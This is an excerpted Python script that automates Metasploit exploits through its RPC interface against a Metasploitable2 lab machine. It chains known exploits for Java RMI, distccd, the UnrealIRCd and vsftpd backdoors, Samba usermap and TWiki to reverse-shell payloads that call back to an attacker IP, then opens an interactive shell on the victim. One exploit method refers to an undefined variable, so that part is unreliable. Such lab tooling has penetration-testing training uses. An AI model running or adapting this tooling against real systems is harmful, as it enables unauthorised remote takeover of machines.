...
from pymetasploit3.msfrpc import MsfRpcClient, SessionManager # pip install pymetasploit3
...
class PyMetasploit:
    ...
    def _end_session(self, sid):
        close = default_input(f"Do you want to close the session {sid}? [y/N] ", default="N")
    ...
    def run(self, *, victim_ip=None):
        ...
        while command != "exit":
            ...
            if stdout:
                print(stdout)
            command = input(self._pretty_cli(shell, victim_ip, need_refresh=False))
...
class VictimHost:
    ...
    def _check_host_reachable(self):
        result = subprocess.call(["ping", "-c", "1", "-w", "1", self.victim_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result != 0:
...
class Metasploitable2(VictimHost):
    ...
    def _exploit_java_rmi_server(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
        metasploit.set_payload(name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)
    
    def _exploit_distccd(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="unix/misc/distcc_exec", rhosts=self.victim_ip, rport=3632)
        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_usermap(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=victim_ip)

    def _exploit_apache_twiki(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
        metasploit.set_console()
        metasploit.run(victim_ip=self.victim_ip)

    def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit):
        metasploit.set_exploit(name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
...
if __name__ == "__main__":
    msfclient = MsfRpcClient(default_input("MSGRPC pwd (default: password): ", "password"), port=55552)
    local_ip = suggest_local_ip()
    metasploit = PyMetasploit(msfclient, default_input(f"Your attacker IP (default: {local_ip}): ", f"{local_ip}"))
    ...
    while True:
        try:
            ...
            if name:
                ...
                action = default_input("Continue exploiting? [Y/n]: ", default="Y")
                if action in ["n", "N"]:
                    break
            else:
                break
